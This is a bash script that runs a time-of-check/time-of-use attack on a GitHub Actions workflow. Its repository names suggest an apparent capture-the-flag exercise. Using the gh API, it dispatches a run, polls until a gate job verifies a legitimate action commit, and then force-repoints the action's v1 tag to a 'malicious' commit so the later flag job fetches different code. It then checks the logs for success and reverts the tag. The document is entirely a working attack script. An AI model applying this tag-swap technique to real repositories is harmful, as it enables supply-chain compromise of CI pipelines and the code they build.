#!/bin/bash
# TOCTOU attack: repoint flag-action@v1 between gate verification and flag job download
set -euo pipefail
export GITHUB_TOKEN=$(gh auth token)

LEGIT_SHA="2b9586dd6eecaf0998da185c71dc96d0ebb02c12"
EVIL_SHA="f41622b69b43638088c0fc28fd3d3cb1605367d2"
REPO="pinpoint-testing/hack-this"
ACTION_REPO="pinpoint-testing/flag-action"

echo "=== TOCTOU ATTACK SIMULATION ==="
echo "Legitimate: $LEGIT_SHA"
echo "Malicious:  $EVIL_SHA"
echo ""

# Disable branch protection temporarily so we can trigger via dispatch
# (protection requires status checks which creates a chicken-and-egg)
echo "[1/6] Triggering workflow..."
gh api -X POST "/repos/$REPO/actions/workflows/ctf.yml/dispatches" -f ref=main 2>/dev/null
sleep 2

# Get the run ID
RUN_ID=$(gh api "/repos/$REPO/actions/runs?per_page=1" --jq '.workflow_runs[0].id')
echo "       Run ID: $RUN_ID"

# Poll for gate job to complete
echo "[2/6] Waiting for gate job to pass..."
GATE_PASSED=false
for i in $(seq 1 60); do
  JOBS=$(gh api "/repos/$REPO/actions/runs/$RUN_ID/jobs" --jq '.jobs[] | "\(.name)|\(.status)|\(.conclusion // "pending")"' 2>/dev/null)
  
  GATE_STATUS=$(echo "$JOBS" | grep "Gate" | head -1)
  FLAG_STATUS=$(echo "$JOBS" | grep "Flag" | head -1 || echo "not started")
  
  echo "       [$i] Gate: $GATE_STATUS | Flag: $FLAG_STATUS"
  
  # Check if gate completed successfully
  if echo "$GATE_STATUS" | grep -q "completed|success"; then
    GATE_PASSED=true
    echo ""
    echo "[3/6] GATE PASSED! Repointing tag NOW!"
    
    # REPOINT THE TAG AS FAST AS POSSIBLE
    gh api -X PATCH "/repos/$ACTION_REPO/git/refs/tags/v1" \
      -f sha="$EVIL_SHA" -F force=true --jq '.object.sha' 2>/dev/null
    
    REPOINT_TIME=$(date -u +%H:%M:%S.%3N)
    echo "       Tag repointed at $REPOINT_TIME UTC"
    echo "       v1 now -> $EVIL_SHA"
    break
  fi
  
  # Check if the whole run already completed (we missed the window)
  RUN_STATUS=$(gh api "/repos/$REPO/actions/runs/$RUN_ID" --jq '.status' 2>/dev/null)
  if [ "$RUN_STATUS" = "completed" ]; then
    echo "       Run completed before we could repoint. Missed the window."
    break
  fi
  
  sleep 1
done

if [ "$GATE_PASSED" = false ]; then
  echo "Gate never passed. Aborting."
  exit 1
fi

# Wait for flag job to complete
echo ""
echo "[4/6] Waiting for flag job to complete..."
for i in $(seq 1 60); do
  RUN_STATUS=$(gh api "/repos/$REPO/actions/runs/$RUN_ID" --jq '.status + "/" + (.conclusion // "pending")' 2>/dev/null)
  echo "       [$i] Run: $RUN_STATUS"
  if echo "$RUN_STATUS" | grep -q "completed"; then
    break
  fi
  sleep 2
done

# Check the flag output
echo ""
echo "[5/6] Checking flag job output..."
FLAG_JOB_ID=$(gh api "/repos/$REPO/actions/runs/$RUN_ID/jobs" --jq '.jobs[] | select(.name | contains("Flag")) | .id')
FLAG_LOGS=$(gh api "/repos/$REPO/actions/jobs/$FLAG_JOB_ID/logs" 2>/dev/null)

echo ""
echo "=== FLAG JOB OUTPUT ==="
echo "$FLAG_LOGS" | grep -E "FLAG|PINPOINT|TOCTOU|PWNED|intact|Download action"
echo "======================="

# Check which SHA the runner actually downloaded
DOWNLOADED_SHA=$(echo "$FLAG_LOGS" | grep "Download action" | grep "flag-action" | grep -oP 'SHA:[a-f0-9]+' || echo "not found")
echo ""
echo "Runner downloaded: $DOWNLOADED_SHA"

if echo "$FLAG_LOGS" | grep -q "TOCTOU_PWNED"; then
  echo ""
  echo "!!! TOCTOU ATTACK SUCCEEDED !!!"
  echo "The runner downloaded the malicious flag-action after gate verified the legitimate one."
else
  echo ""
  echo "TOCTOU attack failed. Runner got the legitimate version."
  echo "The window was too small or the runner cached/resolved the action before we repointed."
fi

# Revert the tag
echo ""
echo "[6/6] Reverting tag..."
gh api -X PATCH "/repos/$ACTION_REPO/git/refs/tags/v1" \
  -f sha="$LEGIT_SHA" -F force=true --jq '.object.sha' 2>/dev/null
echo "       Tag reverted to $LEGIT_SHA"
